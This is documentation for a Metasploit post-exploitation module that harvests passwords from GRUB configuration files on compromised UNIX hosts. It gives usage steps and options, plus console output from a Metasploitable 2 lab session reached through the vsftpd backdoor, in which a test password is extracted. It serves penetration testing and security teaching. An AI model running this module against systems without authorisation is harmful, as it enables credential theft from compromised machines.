# Gather GRUB Passwords

Reads all passwords from GRUB configuration files on UNIX-like machines.

## Vulnerable Application

Any UNIX-like system with a `shell` or `meterpreter` session using GRUB.

## Verification Steps

  1. Get a `shell` or `meterpreter` session on some host.
  2. Do: ```use post/multi/gather/grub_creds```
  3. Do: ```set SESSION [SESSION_ID]```, replacing ```[SESSION_ID]``` with the
     session number you wish to run this one.
  4. Do: ```run```
  5. If the system has readable GRUB configuration files containing a password,
     they will be printed out.

## Options

**FILENAME**

A string that can be used to specify an additional file to check after the
usual places.

**VERBOSE**

A boolean that, when set, will provide more details on what is being checked.
_(Note: this option is defined elsewhere in metasploit, but this module can make
use of it.)_

## Scenarios

Using a Metasploitable 2 VM (running Ubuntu 8.04), you can add the line
`password topscret` to `/boot/grub/menu.lst` if you want to see this module in
action.

## Shell

```
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > use post/multi/gather/grub_creds
msf5 post(multi/gather/grub_creds) > run
[-] Post failed: Msf::OptionValidateError The following options failed to validate: SESSION.
msf5 post(multi/gather/grub_creds) > set SESSION 1
SESSION => 1
msf5 post(multi/gather/grub_creds) > run

[+] /boot/grub/menu.lst:password topsecret
[*] Grub configuration files found and checked: 1.
[*] Post module execution completed
msf5 post(multi/gather/grub_creds) > set VERBOSE true
VERBOSE => true
msf5 post(multi/gather/grub_creds) > set FILENAME /root/grub.cfg
FILENAME => /root/grub.cfg
msf5 post(multi/gather/grub_creds) > run

[*] Finding grub configuration files
[*] Checking /boot/grub/grub.conf
[*] /boot/grub/grub.conf not found or unreadable
[*] Checking /boot/grub/grub.cfg
[*] /boot/grub/grub.cfg not found or unreadable
[*] Checking /boot/grub/menu.lst
[+] /boot/grub/menu.lst:password topsecret
[*] Checking /etc/grub.conf
[*] /etc/grub.conf not found or unreadable
[*] Checking /etc/grub/grub.cfg
[*] /etc/grub/grub.cfg not found or unreadable
[*] Checking /etc/grub.d/00_header
[*] /etc/grub.d/00_header not found or unreadable
[*] Checking /mnt/sysimage/boot/grub.conf
[*] /mnt/sysimage/boot/grub.conf not found or unreadable
[*] Checking /mnt/boot/grub/grub.conf
[*] /mnt/boot/grub/grub.conf not found or unreadable
[*] Checking /rpool/boot/grub/grub.cfg
[*] /rpool/boot/grub/grub.cfg not found or unreadable
[*] Checking /root/grub.cfg
[*] /root/grub.cfg not found or unreadable
[*] Grub configuration files found and checked: 1.
[*] Post module execution completed
msf5 post(multi/gather/grub_creds) >
```

### Meterpreter
```
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > sessions 2
[*] Starting interaction with 2...

meterpreter > run post/multi/gather/grub_creds

[+] /boot/grub/menu.lst:password topsecret
[*] Grub configuration files found and checked: 1.
meterpreter >
```

